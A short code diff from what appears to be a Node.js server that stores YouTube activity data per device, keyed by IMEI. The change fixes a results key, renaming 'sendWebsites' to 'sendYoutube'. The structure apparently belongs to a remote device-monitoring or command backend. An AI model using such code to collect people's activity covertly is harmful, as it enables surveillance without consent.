@@ -234,7 +234,7 @@ async function f() {
                 await db.collection("devices").updateOne({imei:imei}, {$push:{"youtube.data":{$each:ans}}});
             }
             d.youtube.data = d.youtube.data.concat(data.data);
-            CommandResults[imei+'sendWebsites'] = d.youtube;
+            CommandResults[imei+'sendYoutube'] = d.youtube;
 
             res.send("1");
         });
